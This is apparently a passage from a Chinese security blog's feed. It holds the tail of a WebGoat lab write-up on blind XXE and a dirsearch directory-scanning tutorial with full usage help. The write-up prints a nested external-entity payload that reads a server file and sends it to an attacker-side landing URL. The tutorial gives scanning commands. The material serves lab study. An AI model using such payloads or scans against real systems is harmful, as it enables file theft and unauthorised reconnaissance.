&quot;Connection&quot; : [ &quot;keep-alive&quot; ],</span><br><span class="line">      &quot;User-Agent&quot; : [ &quot;Java/17.0.9&quot; ],</span><br><span class="line">      &quot;Host&quot; : [ &quot;localhost:9090&quot; ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;remoteAddress&quot; : null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;response&quot; : &#123;</span><br><span class="line">    &quot;status&quot; : 200,</span><br><span class="line">    &quot;headers&quot; : &#123; &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;timeTaken&quot; : 11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后解密出来时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebGoat 8.0 rocks... (AgzOeuyeHm)</span><br></pre></td></tr></table></figure><p>把这个发送到评论就行了</p><blockquote><p>简述一下过程：发送修改的数据—&gt;%dtd;访问攻击者服务器上的dtd文件—&gt;调用print声明send，调用send，send会再调用file，file用于获取目标服务器上的文件，send发送给攻击者服务器，攻击者服务器获取数据后解析</p></blockquote><h4 id="疑问：">疑问：</h4><p>1.这里为什么需要嵌套</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>答：我试过后看了返回的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;javax.xml.bind.UnmarshalException\\n - with linked exception:\\n[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[5,7]\\nMessage: Server returned HTTP response code: 400 for URL: http:\\/\\/localhost:9090\\/landing?text=%file;]&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">400 Bad Request 是由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。</span></span><br></pre></td></tr></table></figure><p>嵌套应该是为了防止实体用于表示一些无法直接表示的字符或结构（个人猜测）</p><p>2.为什么print后还需要send，print不是会调用send吗</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">dtd;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash"><span class="built_in">print</span>;</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">send;</span></span><br></pre></td></tr></table></figure><p>答：没有调用，仅仅时声明了实体，而send会直接调用file</p><h3 id="12-13">12-13</h3><p>讲了xxe和缓解措施和用过静态代码分析查找xxe问题</p><h2 id="7-Broken-Access-Control">7.Broken Access Control</h2><h2 id="8-Cross-Site-Scripting-XSS">8.Cross-Site Scripting(XSS)</h2><h2 id="9-Insecure-Deserialization">9.Insecure Deserialization</h2><h2 id="10-Vulnerable-Components">10.Vulnerable Components</h2><h2 id="11-Request-Forgeries">11.Request Forgeries</h2><h2 id="12-Client-side">12.Client side</h2><h2 id="13-Challenges">13.Challenges</h2>]]></content>
    
    
    <summary type="html">WebGoat8.22之Write up</summary>
    
    
    
    <category term="CTF" scheme="https://nonevector.top/categories/CTF/"/>
    
    
    <category term="WebGoat" scheme="https://nonevector.top/tags/WebGoat/"/>
    
  </entry>
  
  <entry>
    <title>dirsearch</title>
    <link href="https://nonevector.top/posts/18.html"/>
    <id>https://nonevector.top/posts/18.html</id>
    <published>2023-11-30T03:59:40.527Z</published>
    <updated>2023-12-10T10:29:13.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dirsearch">dirsearch</h2><p>Dirsearch 是一个用于探测 Web 服务器上的隐藏目录和文件的工具。它通过发送 HTTP 请求来尝试访问可能存在的路径，从而找到不列在网站目录页面上的隐藏资源。</p><p>Dirsearch 的主要特点包括：</p><ul><li>多线程：Dirsearch 采用多线程方式进行目录扫描，充分利用系统资源提高扫描效率。</li><li>字典支持：它支持使用自定义字典文件来进行目录爆破，你可以使用自己的字典文件或使用内置的常用字典。（注：字典必须是文本文件）</li><li>支持多种形式的网页（asp，php）</li><li>支持 HTTP 代理</li><li>启发式检测无效的网页</li><li>指定扩展名：你可以选择限制扫描的文件扩展名范围，以便更加精确地进行目录扫描。</li><li>进度追踪：Dirsearch 提供实时进度追踪，你可以看到当前扫描的进度和已发现的目录和文件。</li><li>结果输出：完成扫描后，Dirsearch 会生成详细的扫描报告（纯文本，JSON），展示已发现的隐藏目录和文件。</li></ul><blockquote><p>由于 dirsearch 是基于 python3 的，所以需保证本机含有 python3 环境。</p></blockquote><h2 id="下载">下载</h2><p>1.zip 下载</p><p>dirsearch 下载地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/00.png" alt="1.png"></p><p>2.ssh 下载</p><p>使用直接在 cmd 使用</p><p><code>git clone git@github.com:maurosoria/dirsearch.git</code></p><p>下载到目标文件夹</p><h2 id="下载到本地">下载到本地</h2><p>在下载好的文件下</p><p><s>我搜到的教程前几个都没有安装这个，导致我使用的时候一直提心我缺少依赖 😭</s></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt     //安装依赖包</span><br></pre></td></tr></table></figure><blockquote><p>如果速度太慢了因此报错，可以用国内镜像，即把上面安装依赖包的命令换成下面的命令(推荐)</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.doubanio.com/simple/</span><br></pre></td></tr></table></figure><p>然后安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="常用命令">常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--version              显示dirsearch的版本</span><br><span class="line">-h --help             帮助提示</span><br><span class="line">-u  --url              指定网址</span><br><span class="line">-e                     指定网站语言</span><br><span class="line">-w                指定字典</span><br><span class="line">-r                递归目录（跑出目录后，继续跑目录下面的目录）</span><br><span class="line">-l  --url-list=FILE   目标url文件路径</span><br><span class="line">-i               保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</span><br><span class="line">-x               排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</span><br><span class="line"></span><br><span class="line">简单使用</span><br><span class="line">//简单的使用方法</span><br><span class="line">python3 dirsearch.py -u https://target</span><br><span class="line">//使用文件拓展名为php和txt以及js的字典扫描目标</span><br><span class="line">python3 dirsearch.py -e php,txt,js -u https://target</span><br><span class="line">//采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url</span><br><span class="line">python3 dirsearch.py -e php,txt,js -u https://target -w /path/to/wordlist</span><br><span class="line">//采用递归扫描</span><br><span class="line">python3 dirsearch.py -e php,txt,js -u https://target -r</span><br><span class="line">//采用递归扫描 递归层数为三层</span><br><span class="line">python3 dirsearch.py -e php,txt,js -u https://target -r -R 3</span><br></pre></td></tr></table></figure><h2 id="所有语法及翻译">所有语法及翻译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">C:\Python3\Dirsearch\dirsearch-master&gt;python dirsearch.py -h</span><br><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">  Mandatory:</span><br><span class="line">    -u URL, --url=URL   Target URL(s), can use multiple flags</span><br><span class="line">    -l PATH, --urls-file=PATH</span><br><span class="line">                        URL list file</span><br><span class="line">    --stdin             Read URL(s) from STDIN</span><br><span class="line">    --cidr=CIDR         Target CIDR</span><br><span class="line">    --raw=PATH          Load raw HTTP request from file (use &#x27;--scheme&#x27; flag</span><br><span class="line">                        to set the scheme)</span><br><span class="line">    -s SESSION_FILE, --session=SESSION_FILE</span><br><span class="line">                        Session file</span><br><span class="line">    --config=PATH       Path to configuration file (Default:</span><br><span class="line">                        &#x27;DIRSEARCH_CONFIG&#x27; environment variable, otherwise</span><br><span class="line">                        &#x27;config.ini&#x27;)</span><br><span class="line"></span><br><span class="line">  Dictionary Settings:</span><br><span class="line">    -w WORDLISTS, --wordlists=WORDLISTS</span><br><span class="line">                        Wordlist files or directories contain wordlists</span><br><span class="line">                        (separated by commas)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        Extension list separated by commas (e.g. php,asp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        Add extensions to the end of every wordlist entry. By</span><br><span class="line">                        default dirsearch only replaces the %EXT% keyword with</span><br><span class="line">                        extensions</span><br><span class="line">    -O, --overwrite-extensions</span><br><span class="line">                        Overwrite other extensions in the wordlist with your</span><br><span class="line">                        extensions (selected via `-e`)</span><br><span class="line">    --exclude-extensions=EXTENSIONS</span><br><span class="line">                        Exclude extension list separated by commas (e.g.</span><br><span class="line">                        asp,jsp)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        Remove extensions in all paths (e.g. admin.php -&gt;</span><br><span class="line">                        admin)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        Add custom prefixes to all wordlist entries (separated</span><br><span class="line">                        by commas)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        Add custom suffixes to all wordlist entries, ignore</span><br><span class="line">                        directories (separated by commas)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings:</span><br><span class="line">    -t THREADS, --threads=THREADS</span><br><span class="line">                        Number of threads</span><br><span class="line">    -r, --recursive     Brute-force recursively</span><br><span class="line">    --deep-recursive    Perform recursive scan on every directory depth (e.g.</span><br><span class="line">                        api/users -&gt; api/)</span><br><span class="line">    --force-recursive   Do recursive brute-force for every found path, not</span><br><span class="line">                        only directories</span><br><span class="line">    -R DEPTH, --max-recursion-depth=DEPTH</span><br><span class="line">                        Maximum recursion depth</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        Valid status codes to perform recursive scan, support</span><br><span class="line">                        ranges (separated by commas)</span><br><span class="line">    --subdirs=SUBDIRS   Scan sub-directories of the given URL[s] (separated by</span><br><span class="line">                        commas)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        Exclude the following subdirectories during recursive</span><br><span class="line">                        scan (separated by commas)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        Include status codes, separated by commas, support</span><br><span class="line">                        ranges (e.g. 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        Exclude status codes, separated by commas, support</span><br><span class="line">                        ranges (e.g. 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        Exclude responses by sizes, separated by commas (e.g.</span><br><span class="line">                        0B,4KB)</span><br><span class="line">    --exclude-text=TEXTS</span><br><span class="line">                        Exclude responses by text, can use multiple flags</span><br><span class="line">    --exclude-regex=REGEX</span><br><span class="line">                        Exclude responses by regular expression</span><br><span class="line">    --exclude-redirect=STRING</span><br><span class="line">                        Exclude responses if this regex (or text) matches</span><br><span class="line">                        redirect URL (e.g. &#x27;/index.html&#x27;)</span><br><span class="line">    --exclude-response=PATH</span><br><span class="line">                        Exclude responses similar to response of this page,</span><br><span class="line">                        path as input (e.g. 404.html)</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        Skip target whenever hit one of these status codes,</span><br><span class="line">                        separated by commas, support ranges</span><br><span class="line">    --min-response-size=LENGTH</span><br><span class="line">                        Minimum response length</span><br><span class="line">    --max-response-size=LENGTH</span><br><span class="line">                        Maximum response length</span><br><span class="line">    --max-time=SECONDS  Maximum runtime for the scan</span><br><span class="line">    --exit-on-error     Exit whenever an error occurs</span><br><span class="line"></span><br><span class="line">  Request Settings:</span><br><span class="line">    -m METHOD, --http-method=METHOD</span><br><span class="line">                        HTTP method (default: GET)</span><br><span class="line">    -d DATA, --data=DATA</span><br><span class="line">                        HTTP request data</span><br><span class="line">    --data-file=PATH    File contains HTTP request data</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP request header, can use multiple flags</span><br><span class="line">    --headers-file=PATH</span><br><span class="line">                        File contains HTTP request headers</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        Follow HTTP redirects</span><br><span class="line">    --random-agent      Choose a random User-Agent for each request</span><br><span class="line">    --auth=CREDENTIAL   Authentication credential (e.g. user:password or</span><br><span class="line">                        bearer token)</span><br><span class="line">    --auth-type=TYPE    Authentication type (basic, digest, bearer, ntlm, jwt)</span><br><span class="line">    --cert-file=PATH    File contains client-side certificate</span><br><span class="line">    --key-file=PATH     File contains client-side certificate private key</span><br><span class="line">                        (unencrypted)</span><br><span class="line">    --user-agent=USER_AGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings:</span><br><span class="line">    --timeout=TIMEOUT   Connection timeout</span><br><span class="line">    --delay=DELAY       Delay between requests</span><br><span class="line">    -p PROXY, --proxy=PROXY</span><br><span class="line">                        Proxy URL (HTTP/SOCKS), can use multiple flags</span><br><span class="line">    --proxies-file=PATH</span><br><span class="line">                        File contains proxy servers</span><br><span class="line">    --proxy-auth=CREDENTIAL</span><br><span class="line">                        Proxy authentication credential</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        Proxy to replay with found paths</span><br><span class="line">    --tor               Use Tor network as proxy</span><br><span class="line">    --scheme=SCHEME     Scheme for raw request or if there is no scheme in the</span><br><span class="line">                        URL (Default: auto-detect)</span><br><span class="line">    --max-rate=RATE     Max requests per second</span><br><span class="line">    --retries=RETRIES   Number of retries for failed requests</span><br><span class="line">    --ip=IP             Server IP address</span><br><span class="line"></span><br><span class="line">  Advanced Settings:</span><br><span class="line">    --crawl             Crawl for new paths in responses</span><br><span class="line"></span><br><span class="line">  View Settings:</span><br><span class="line">    --full-url          Full URLs in the output (enabled automatically in</span><br><span class="line">                        quiet mode)</span><br><span class="line">    --redirects-history</span><br><span class="line">                        Show redirects history</span><br><span class="line">    --no-color          No colored output</span><br><span class="line">    -q, --quiet-mode    Quiet mode</span><br><span class="line"></span><br><span class="line">  Output Settings:</span><br><span class="line">    -o PATH/URL, --output=PATH/URL</span><br><span class="line">                        Output file or MySQL/PostgreSQL URL (Format:</span><br><span class="line">                        scheme://[username:password@]host[:port]/database-</span><br><span class="line">                        name)</span><br><span class="line">    --format=FORMAT     Report format (Available: simple,plain,json,xml,md,csv</span><br><span class="line">                        ,html,sqlite,mysql,postgresql)</span><br><span class="line">    --log=PATH          Log file</span><br><span class="line"></span><br><span class="line">See &#x27;config.ini&#x27; for the example configuration file</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>翻译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">用法：dirsearch.py [-u|--url] 目标 [-e|--extensions] 扩展名 [选项]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --help            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">必需：</span><br><span class="line">  -u URL, --url=URL     目标URL，可以使用多个选项指定多个目标URL</span><br><span class="line">  -l PATH, --urls-file=PATH</span><br><span class="line">                        URL列表文件</span><br><span class="line">  --stdin               从标准输入读取URL</span><br><span class="line">  --cidr=CIDR           目标CIDR</span><br><span class="line">  --raw=PATH            从文件加载原始HTTP请求（使用&#x27;--scheme&#x27;标志设置方案）</span><br><span class="line">  -s SESSION_FILE, --session=SESSION_FILE</span><br><span class="line">                        会话文件</span><br><span class="line">  --config=PATH         配置文件路径（默认为&#x27;DIRSEARCH_CONFIG&#x27;环境变量，否则为&#x27;config.ini&#x27;）</span><br><span class="line"></span><br><span class="line">字典设置:</span><br><span class="line">  -w WORDLISTS, --wordlists=WORDLISTS</span><br><span class="line">                        单词列表文件或包含单词列表文件的目录（以逗号分隔）</span><br><span class="line">  -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        扩展名列表，以逗号分隔（例如：php,asp）</span><br><span class="line">  -f, --force-extensions</span><br><span class="line">                        在每个单词列表条目的末尾添加扩展名。默认情况下，dirsearch只替换%EXT%关键字为扩展名。</span><br><span class="line">  -O, --overwrite-extensions</span><br><span class="line">                        使用指定的扩展名覆盖单词列表中的其他扩展名（通过&#x27;-e&#x27;选择）</span><br><span class="line">  --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除的扩展名列表，以逗号分隔（例如：asp,jsp）</span><br><span class="line">  --remove-extensions   删除所有路径中的扩展名（例如：admin.php -&gt; admin）</span><br><span class="line">  --prefixes=PREFIXES   将自定义前缀添加到所有单词列表条目中（以逗号分隔）</span><br><span class="line">  --suffixes=SUFFIXES   将自定义后缀添加到所有单词列表条目中，忽略目录（以逗号分隔）</span><br><span class="line">  -U, --uppercase       单词列表转为大写</span><br><span class="line">  -L, --lowercase       单词列表转为小写</span><br><span class="line">  -C, --capital         单词首字母大写</span><br><span class="line"></span><br><span class="line">通用设置:</span><br><span class="line">  -t THREADS, --threads=THREADS</span><br><span class="line">                        线程数</span><br><span class="line">  -r, --recursive       递归地进行强制破解</span><br><span class="line">  --deep-recursive      在每个目录深度上执行递归扫描（例如：api/users -&gt; api/）</span><br><span class="line">  --force-recursive     对找到的每个路径执行递归强制破解，而不仅仅是目录</span><br><span class="line">  -R DEPTH, --max-recursion-depth=DEPTH</span><br><span class="line">                        最大递归深度</span><br><span class="line">  --recursion-status=CODES</span><br><span class="line">                        用于执行递归扫描的有效状态码，支持范围（以逗号分隔）</span><br><span class="line">  --subdirs=SUBDIRS     扫描给定URL的子目录（以逗号分隔）</span><br><span class="line">  --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归扫描期间排除以下子目录（以逗号分隔）</span><br><span class="line">  -i CODES, --include-status=CODES</span><br><span class="line">                        包括的状态码，以逗号分隔，支持范围（例如：200,300-399）</span><br><span class="line">  -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除的状态码，以逗号分隔，支持范围（例如：301,500-599）</span><br><span class="line">  --exclude-sizes=SIZES</span><br><span class="line">                        根据大小排除响应，以逗号分隔（例如：0B,4KB）</span><br><span class="line">  --exclude-text=TEXTS  根据文本排除响应，可以使用多个标志</span><br><span class="line">  --exclude-regex=REGEX</span><br><span class="line">                        根据正则表达式排除响应</span><br><span class="line">  --exclude-redirect=STRING</span><br><span class="line">                        如果此正则表达式（或文本）与重定向URL匹配，则排除响应（例如：&#x27;/index.html&#x27;）</span><br><span class="line">  --exclude-response=PATH</span><br><span class="line">                        排除类似于此页面响应的响应，路径作为输入（例如：404.html）</span><br><span class="line">  --skip-on-status=CODES</span><br><span class="line">                        每当命中这些状态码之一时跳过目标，以逗号分隔，支持范围</span><br><span class="line">  --min-response-size=LENGTH</span><br><span class="line">                        响应的最小长度</span><br><span class="line">  --max-response-size=LENGTH</span><br><span class="line">                        响应的最大长度</span><br><span class="line">  --max-time=SECONDS    扫描的最大运行时间</span><br><span class="line">  --exit-on-error       发生错误时退出</span><br><span class="line"></span><br><span class="line">请求设置:</span><br><span class="line">  -m METHOD, --http-method=METHOD</span><br><span class="line">                        HTTP请求方法（默认为GET）</span><br><span class="line">  -d DATA, --data=DATA  HTTP请求数据</span><br><span class="line">  --data-file=PATH      包含HTTP请求数据的文件</span><br><span class="line">  -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求标头，可以使用多个标志</span><br><span class="line">  --headers-file=PATH   包含HTTP请求标头的文件</span><br><span class="line">  -F, --follow-redirects</span><br><span class="line">                        跟随HTTP重定向</span><br><span class="line">  --random-agent        每个请求选择一个随机User-Agent</span><br><span class="line">  --auth=CREDENTIAL     认证凭据（例如：user:password或bearer token）</span><br><span class="line">  --auth-type=TYPE      认证类型（basic、digest、bearer、ntlm、jwt）</span><br><span class="line">  --cert-file=PATH      包含客户端证书的文件</span><br><span class="line">  --key-file=PATH       包含客户端证书私钥的文件（未加密）</span><br><span class="line">  --user-agent=USER_AGENT</span><br><span class="line">  --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">连接设置:</span><br><span class="line">  --timeout=TIMEOUT     连接超时时间</span><br><span class="line">  --delay=DELAY         请求之间的延迟</span><br><span class="line">  -p PROXY, --proxy=PROXY</span><br><span class="line">                        代理URL（HTTP/SOCKS），可以使用多个标志</span><br><span class="line">  --proxies-file=PATH   包含代理服务器的文件</span><br><span class="line">  --proxy-auth=CREDENTIAL</span><br><span class="line">                        代理认证凭据</span><br><span class="line">  --replay-proxy=PROXY  用于重放已发现路径的代理</span><br><span class="line">  --tor                 使用Tor网络作为代理</span><br><span class="line">  --scheme=SCHEME       原始请求的协议或URL中没有协议时使用的协议（默认为自动检测）</span><br><span class="line">  --max-rate=RATE       每秒请求数最大值</span><br><span class="line">  --retries=RETRIES     失败请求的重试次数</span><br><span class="line">  --ip=IP               服务器IP地址</span><br><span class="line"></span><br><span class="line">高级设置:</span><br><span class="line">  --crawl               在响应中爬取新路径</span><br><span class="line"></span><br><span class="line">显示设置:</span><br><span class="line">  --full-url            在输出中显示完整URL（在静默模式下自动启用）</span><br><span class="line">  --redirects-history   显示重定向历史记录</span><br><span class="line">  --no-color            不使用彩色输出</span><br><span class="line">  -q, --quiet-mode      安静模式</span><br><span class="line"></span><br><span class="line">输出设置:</span><br><span class="line">  -o PATH/URL, --output=PATH/URL</span><br><span class="line">                        输出文件或MySQL/PostgreSQL数据库URL（格式：</span><br><span class="line">                        scheme://[username:password@]host[:port]/database-</span><br><span class="line">                        name）</span><br><span class="line">  --format=FORMAT       报告格式（可用：simple、plain、json、xml、md、csv、html、</span><br><span class="line">                        sqlite、mysql、postgresql）</span><br><span class="line">  --log=PATH            日志文件</span><br><span class="line"></span><br><span class="line">有关示例配置文件，请参见“config.ini”</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">dirsearch下载与介绍</summary>
    
    
    
    <category term="随记" scheme="https://nonevector.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="dirsearch" scheme="https://nonevector.top/tags/dirsearch/"/>
    
  </entry>
  
  <entry>
    <title>CTF之CTFHub学习记录</title>
    <link href="https://nonevector.top/posts/17.html"/>
    <id>https://nonevector.top/posts/17.html</id>
    <published>2023-11-29T03:27:46.379Z</published>
    <updated>2023-12-31T10:47:07.704Z</updated>
    
